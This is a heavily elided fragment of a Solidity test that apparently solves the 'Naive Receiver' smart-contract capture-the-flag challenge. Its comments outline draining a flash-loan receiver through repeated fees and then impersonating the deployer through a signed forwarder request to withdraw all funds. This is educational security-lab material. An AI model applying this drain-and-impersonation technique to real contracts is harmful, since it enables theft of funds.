...
contract NaiveReceiverChallenge is Test {
    ...
    function test_naiveReceiver() public checkSolvedByPlayer {
        // Drain the receiver contract through fees as fee per  each flasloan tx is 1WETH
        //10 flashloan txs should be enough to drain the receiver contract of all 10WETH
        //The last tx would be used to withdraw
        ...
        ); //Impersonate deployer and withdraw all funds to recovery contract.
        ...
        bytes32 messageDigest = forwarder.hashTypedData(structHash);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, messageDigest);
